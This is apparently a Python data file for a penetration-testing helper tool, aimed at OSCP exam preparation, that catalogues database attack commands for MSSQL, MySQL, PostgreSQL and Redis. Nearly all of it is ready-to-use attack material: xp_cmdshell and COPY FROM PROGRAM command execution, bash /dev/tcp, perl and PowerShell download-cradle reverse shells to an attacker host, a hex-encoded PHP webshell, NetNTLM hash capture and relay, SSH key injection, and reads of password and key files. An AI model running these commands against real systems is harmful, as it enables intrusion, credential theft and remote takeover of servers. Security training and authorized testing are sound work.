"""
Database Enumeration Alternative Commands

Manual alternatives for MySQL, PostgreSQL, MSSQL, Redis, and NoSQL database exploitation.
Extracted from HackTricks-based service plugins.
"""

from ..models import AlternativeCommand, Variable


ALTERNATIVES = [
    # ========================================================================
    # MSSQL ALTERNATIVES
    # ========================================================================

    AlternativeCommand(
        id='alt-mssql-xp-cmdshell-enable',
        name='MSSQL: Enable xp_cmdshell for RCE',
        command_template='impacket-mssqlclient <TARGET> -port <PORT> -windows-auth',
        description='Enable xp_cmdshell on MSSQL for OS command execution (requires sysadmin privileges)',
        category='database-enum',
        subcategory='mssql',
        variables=[
            Variable(name='TARGET', description='Target IP', example='192.168.45.100', auto_resolve=True, required=True),
            Variable(name='PORT', description='MSSQL port', example='1433', auto_resolve=True, required=True)
        ],
        tags=['OSCP:HIGH', 'EXPLOIT', 'RCE', 'WINDOWS'],
        os_type='both',
        flag_explanations={
            '-windows-auth': 'Use Windows authentication (try without credentials first)',
            '-port': 'Specify non-standard MSSQL port if needed'
        },
        success_indicators=[
            'SQL> prompt appears',
            'Connection established',
            'Can execute: EXEC xp_cmdshell "whoami"'
        ],
        failure_indicators=[
            'Access denied',
            'Must be sysadmin to enable xp_cmdshell',
            'Connection refused'
        ],
        next_steps=[
            'Enable: EXEC sp_configure \'Show Advanced Options\', 1; RECONFIGURE;',
            'Enable: EXEC sp_configure \'xp_cmdshell\', 1; RECONFIGURE;',
            'Test: EXEC xp_cmdshell \'whoami\'',
            'Reverse shell: EXEC xp_cmdshell \'powershell IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/rev.ps1")\''
        ],
        notes='xp_cmdshell is #1 MSSQL RCE method for OSCP. Service account often has SeImpersonatePrivilege. Alternative if xp_cmdshell blocked: sp_OACreate/sp_OAMethod, SQL Agent jobs, CLR assemblies',
        parent_task_pattern='mssql-*'
    ),

    AlternativeCommand(
        id='alt-mssql-steal-ntlm-hash',
        name='MSSQL: Steal NetNTLM Hash via UNC Path',
        command_template='sudo responder -I tun0',
        description='Force MSSQL service account to authenticate to attacker SMB server, capturing NetNTLM hash for cracking/relay',
        category='database-enum',
        subcategory='mssql',
        variables=[],
        tags=['OSCP:HIGH', 'QUICK_WIN', 'CREDS', 'WINDOWS'],
        os_type='linux',
        flag_explanations={
            '-I': 'Network interface to listen on (tun0 for VPN, eth0 for LAN)',
            'sudo': 'Required to bind to port 445 (SMB)'
        },
        success_indicators=[
            'Responder displays captured NetNTLMv2 hash',
            'Hash format: username::domain:challenge:response',
            'Service account name revealed'
        ],
        failure_indicators=[
            'No connection received',
            'Outbound SMB blocked by firewall',
            'Hash already captured (check /usr/share/responder/logs/)'
        ],
        next_steps=[
            'On attacker (after Responder running): Execute SQL query',
            'SQL: EXEC xp_dirtree \'\\\\\\\\<LHOST>\\\\share\';',
            'Alternative: EXEC master..xp_subdirs \'\\\\\\\\<LHOST>\\\\share\'',
            'Crack hash: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt',
            'Or relay: impacket-ntlmrelayx -tf targets.txt -smb2support'
        ],
        notes='MSSQL service accounts often domain accounts with elevated privileges. Hash relay may work better than cracking. Check permissions: USE master; EXEC sp_helprotect \'xp_dirtree\';',
        parent_task_pattern='mssql-*'
    ),

    # ========================================================================
    # MySQL ALTERNATIVES
    # ========================================================================

    AlternativeCommand(
        id='alt-mysql-read-file',
        name='MySQL: Read Sensitive Files via LOAD_FILE',
        command_template='mysql -h <TARGET> -u <USERNAME> -p<PASSWORD> -e "SELECT LOAD_FILE(\'/etc/passwd\');"',
        description='Read arbitrary files from filesystem using MySQL LOAD_FILE() function (requires FILE privilege)',
        category='database-enum',
        subcategory='mysql',
        variables=[
            Variable(name='TARGET', description='Target IP', example='192.168.45.100', auto_resolve=True, required=True),
            Variable(name='USERNAME', description='MySQL username', example='root', auto_resolve=False, required=True),
            Variable(name='PASSWORD', description='MySQL password', example='password123', auto_resolve=False, required=True)
        ],
        tags=['OSCP:HIGH', 'FILE_READ', 'LINUX', 'WINDOWS'],
        os_type='both',
        flag_explanations={
            '-h': 'Target hostname/IP',
            '-u': 'Username to authenticate as',
            '-p': 'Password (no space after -p)',
            '-e': 'Execute SQL statement and exit',
            'LOAD_FILE()': 'MySQL function to read file contents into query result'
        },
        success_indicators=[
            'File contents displayed in query result',
            '/etc/passwd entries visible',
            'No NULL return (NULL = file not found or no permission)'
        ],
        failure_indicators=[
            'NULL result (file not found or permission denied)',
            'secure-file-priv restriction blocks access',
            'FILE privilege missing (check: SHOW GRANTS;)'
        ],
        next_steps=[
            'Check restriction: SHOW VARIABLES LIKE \'secure_file_priv\';',
            'If empty = unrestricted, if NULL = disabled, if path = limited to directory',
            'Read: /etc/passwd, /home/user/.ssh/id_rsa, /var/www/html/config.php',
            'Read: /etc/mysql/debian.cnf (plaintext debian-sys-maint password)',
            'Web config: /var/www/html/wp-config.php, /var/www/html/config.php'
        ],
        notes='Common targets: /etc/passwd, SSH keys, web configs, debian.cnf. Check secure_file_priv first to understand restrictions. Modern MySQL restricts file operations by default',
        parent_task_pattern='mysql-*'
    ),

    AlternativeCommand(
        id='alt-mysql-write-webshell',
        name='MySQL: Write PHP Webshell via INTO OUTFILE',
        command_template='mysql -h <TARGET> -u <USERNAME> -p<PASSWORD> -e "SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e INTO OUTFILE \'/var/www/html/<FILENAME>.php\';"',
        description='Write PHP webshell to web root for RCE (requires FILE privilege + web root write access)',
        category='database-enum',
        subcategory='mysql',
        variables=[
            Variable(name='TARGET', description='Target IP', example='192.168.45.100', auto_resolve=True, required=True),
            Variable(name='USERNAME', description='MySQL username', example='root', auto_resolve=False, required=True),
            Variable(name='PASSWORD', description='MySQL password', example='password123', auto_resolve=False, required=True),
            Variable(name='FILENAME', description='Webshell filename (without extension)', example='shell', auto_resolve=False, required=True)
        ],
        tags=['OSCP:HIGH', 'EXPLOIT', 'RCE', 'WEBSHELL'],
        os_type='both',
        flag_explanations={
            'INTO OUTFILE': 'Write query result to file on server filesystem',
            '0x3c3f706...': 'Hex-encoded PHP webshell: <?php system($_GET["cmd"]); ?>',
            '/var/www/html/': 'Web root (Debian/Ubuntu), adjust for target OS'
        },
        success_indicators=[
            'Query OK (file written)',
            'Webshell accessible: curl http://<TARGET>/<FILENAME>.php?cmd=id',
            'Command output returned via HTTP'
        ],
        failure_indicators=[
            'secure-file-priv blocks write',
            'Permission denied on web root',
            'File already exists (cannot overwrite with INTO OUTFILE)'
        ],
        next_steps=[
            'Access: curl http://<TARGET>/<FILENAME>.php?cmd=id',
            'Reverse shell: curl http://<TARGET>/<FILENAME>.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<LHOST>%2F4444%200%3E%261%22',
            'Alternative web roots: /usr/share/nginx/html (nginx), C:\\inetpub\\wwwroot (Windows IIS), C:\\xampp\\htdocs (XAMPP)'
        ],
        notes='Web roots vary by OS/web server: /var/www/html (Apache Debian), /usr/share/nginx/html (nginx), C:\\xampp\\htdocs (Windows XAMPP). Cannot overwrite existing files - use unique names. Alternative if INTO OUTFILE blocked: Use UDF privilege escalation or large objects',
        parent_task_pattern='mysql-*'
    ),

    # ========================================================================
    # PostgreSQL ALTERNATIVES
    # ========================================================================

    AlternativeCommand(
        id='alt-postgres-copy-rce',
        name='PostgreSQL: RCE via COPY FROM PROGRAM',
        command_template='psql -h <TARGET> -p <PORT> -U <USERNAME> -c "DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM \'<COMMAND>\'; SELECT * FROM cmd_exec;"',
        description='Execute OS commands via COPY FROM PROGRAM (requires superuser or pg_execute_server_program role)',
        category='database-enum',
        subcategory='postgresql',
        variables=[
            Variable(name='TARGET', description='Target IP', example='192.168.45.100', auto_resolve=True, required=True),
            Variable(name='PORT', description='PostgreSQL port', example='5432', auto_resolve=True, required=True),
            Variable(name='USERNAME', description='PostgreSQL username', example='postgres', auto_resolve=False, required=True),
            Variable(name='COMMAND', description='OS command to execute', example='id', auto_resolve=False, required=True)
        ],
        tags=['OSCP:HIGH', 'EXPLOIT', 'RCE', 'LINUX'],
        os_type='both',
        flag_explanations={
            'COPY FROM PROGRAM': 'PostgreSQL feature to execute shell command and read output into table',
            'DROP TABLE IF EXISTS': 'Clean up any existing test table',
            'CREATE TABLE': 'Temporary table to store command output',
            '-c': 'Execute SQL command and exit'
        },
        success_indicators=[
            'Command output displayed in table',
            'uid=xxx(postgres) gid=xxx',
            'No permission denied error'
        ],
        failure_indicators=[
            'must be superuser or member of pg_execute_server_program',
            'Permission denied',
            'COPY FROM PROGRAM not allowed'
        ],
        next_steps=[
            'Check privileges: SELECT rolname, rolsuper FROM pg_roles WHERE rolname = current_user;',
            'Reverse shell: COPY cmd_exec FROM PROGRAM \'bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"\';',
            'Alternative payload: perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'',
            'If CREATEROLE: GRANT pg_execute_server_program TO <USERNAME>;'
        ],
        notes='CVE-2019-9193 - PostgreSQL declared this a feature, not a vuln. Escape single quotes with two single quotes. Start listener first: nc -lvnp 4444. Alternative if blocked: ssl_passphrase_command, archive_command, session_preload_libraries',
        parent_task_pattern='postgresql-*'
    ),

    # ========================================================================
    # Redis ALTERNATIVES
    # ========================================================================

    AlternativeCommand(
        id='alt-redis-write-webshell',
        name='Redis: Write PHP Webshell via Config Manipulation',
        command_template='redis-cli -h <TARGET>',
        description='Write PHP webshell to web root by manipulating Redis config (requires unauthenticated or authenticated access)',
        category='database-enum',
        subcategory='redis',
        variables=[
            Variable(name='TARGET', description='Target IP', example='192.168.45.100', auto_resolve=True, required=True)
        ],
        tags=['OSCP:HIGH', 'EXPLOIT', 'RCE', 'WEBSHELL'],
        os_type='linux',
        flag_explanations={
            '-h': 'Target Redis server hostname/IP',
            'config set dir': 'Change Redis database file save directory',
            'config set dbfilename': 'Change Redis database filename',
            'save': 'Force Redis to write database to disk'
        },
        success_indicators=[
            'Config commands return OK',
            'File written to web root',
            'Webshell accessible via browser',
            'Command execution confirmed'
        ],
        failure_indicators=[
            'Permission denied on web root',
            'Web root path incorrect',
            'Redis config locked (CONFIG commands disabled)',
            'Authentication required: -NOAUTH'
        ],
        next_steps=[
            'Interactive commands:',
            '> config set dir /var/www/html',
            '> config set dbfilename shell.php',
            '> set test "<?php system($_GET[\'cmd\']); ?>"',
            '> save  # Force database write to create shell.php',
            'Access: http://<TARGET>/shell.php?cmd=id',
            'Reverse shell: ?cmd=bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"',
            'IMPORTANT: Backup first - CONFIG GET dir, CONFIG GET dbfilename',
            'Restore after: config set dir <original>, config set dbfilename <original>'
        ],
        notes='May corrupt Redis database - backup config first. Web roots: /var/www/html (Apache), /usr/share/nginx/html (nginx), C:\\inetpub\\wwwroot (IIS). Alternative if config locked: SSH key injection, cron injection, module loading',
        parent_task_pattern='redis-*'
    ),

    AlternativeCommand(
        id='alt-redis-ssh-key-injection',
        name='Redis: SSH Key Injection for Passwordless Access',
        command_template='ssh-keygen -t rsa -f redis_key -N ""',
        description='Inject SSH public key into authorized_keys via Redis for passwordless shell access',
        category='database-enum',
        subcategory='redis',
        variables=[
            Variable(name='TARGET', description='Target IP', example='192.168.45.100', auto_resolve=True, required=True)
        ],
        tags=['OSCP:HIGH', 'EXPLOIT', 'RCE', 'SSH'],
        os_type='linux',
        flag_explanations={
            '-t rsa': 'Generate RSA key pair',
            '-f': 'Output filename (redis_key)',
            '-N ""': 'No passphrase (empty string)',
            '-x': 'Read key from stdin (used with redis-cli)'
        },
        success_indicators=[
            'SSH key generated (redis_key + redis_key.pub)',
            'Key written to authorized_keys via Redis',
            'SSH connection established: ssh -i redis_key redis@<TARGET>',
            'Shell access as redis user'
        ],
        failure_indicators=[
            'Permission denied on ~/.ssh/',
            '~/.ssh directory does not exist',
            'SSH service not running',
            'Wrong user home directory'
        ],
        next_steps=[
            '1. Generate key: ssh-keygen -t rsa -f redis_key -N ""',
            '2. Format: (echo -e "\\n\\n"; cat redis_key.pub; echo -e "\\n\\n") > key.txt',
            '3. Import: cat key.txt | redis-cli -h <TARGET> -x set ssh_key',
            '4. Configure Redis:',
            '   redis-cli -h <TARGET>',
            '   > config set dir /var/lib/redis/.ssh',
            '   > config set dbfilename "authorized_keys"',
            '   > save  # Force Redis to write database to disk',
            '5. SSH: ssh -i redis_key redis@<TARGET>',
            'Alternative users: /home/<username>/.ssh/authorized_keys',
            'Check sudo: sudo -l',
            'Escalate to root if sudo available'
        ],
        notes='Automated tool: https://github.com/Avinash-acid/Redis-Server-Exploit. Brute force users: https://github.com/captain-woof/redis-rce-ssh. Common users: redis, www-data, ubuntu, centos. Check if .ssh exists first: config set dir /var/lib/redis/.ssh (if fails, directory missing)',
        parent_task_pattern='redis-*'
    ),

    # ========================================================================
    # GENERIC DATABASE ENUMERATION
    # ========================================================================

    AlternativeCommand(
        id='alt-db-test-default-creds',
        name='Test Default Database Credentials',
        command_template='# Try default credentials based on detected database type',
        description='Quick win - test common default credentials before brute forcing (MANUAL step-by-step)',
        category='database-enum',
        variables=[],
        tags=['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
        os_type='both',
        flag_explanations={},
        success_indicators=[
            'Connection established without error',
            'Database prompt appears',
            'Can execute queries'
        ],
        failure_indicators=[
            'Authentication failed',
            'Access denied',
            'Account locked'
        ],
        next_steps=[
            'MySQL: mysql -h <TARGET> -u root (no password)',
            'MySQL: mysql -h <TARGET> -u root -proot',
            'MySQL: mysql -h <TARGET> -u admin -padmin',
            'PostgreSQL: psql -h <TARGET> -U postgres (no password)',
            'PostgreSQL: psql -h <TARGET> -U postgres -W (prompt for password: postgres)',
            'MSSQL: impacket-mssqlclient <TARGET> -windows-auth (try no creds)',
            'MSSQL: crackmapexec mssql <TARGET> -u sa -p "" (blank password)',
            'MSSQL: crackmapexec mssql <TARGET> -u sa -p sa',
            'MongoDB: mongo <TARGET>:27017 (often no auth)',
            'Redis: redis-cli -h <TARGET> (often no auth)',
            'If successful: enumerate databases, users, privileges immediately'
        ],
        notes='Always test default/null credentials before brute forcing. Saves time and avoids account lockout. Document source in OSCP report if successful',
        parent_task_pattern='*-enum-*'
    ),
]
